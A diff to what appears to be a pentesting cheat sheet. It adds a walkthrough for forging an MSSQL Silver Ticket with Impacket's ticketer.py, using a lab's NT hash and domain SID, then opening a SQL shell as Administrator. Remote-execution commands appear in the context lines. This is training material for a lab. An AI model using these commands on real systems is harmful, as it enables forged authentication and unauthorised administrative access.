@@ -134,3 +134,48 @@ psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
+
+MSSQL Silver Ticket:
+
+```bash
+ticketer.py -spn "MSSQLSvc/"<host name>" -user "<user>" -password "<pass>" -nthash "<NTLM Hash of SPN Account>" -domain "<domain>" -domain-sid "<SID of DOMAIN>" -dc-ip "<host name>" -user-id "<id of impersoanted user>" "<user to impersonate>"
+```
+
+Full Command:
+
+```bash
+ticketer.py -spn "MSSQLSvc/dc1.scrm.local" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local -user-id 500 Administrator
+```
+
+Full Example:
+
+```bash
+garffff@garffff:~/htb/scrambled$ ticketer.py -spn "MSSQLSvc/dc1.scrm.local" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local -user-id 500 Administrator
+Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+garffff@garffff:~/htb/scrambled$ export KRB5CCNAME=./Administrator.ccache 
+garffff@garffff:~/htb/scrambled$ mssqlclient.py dc1.scrm.local -k
+Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to 'master'.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SCRM\administrator  dbo@master)>
+```
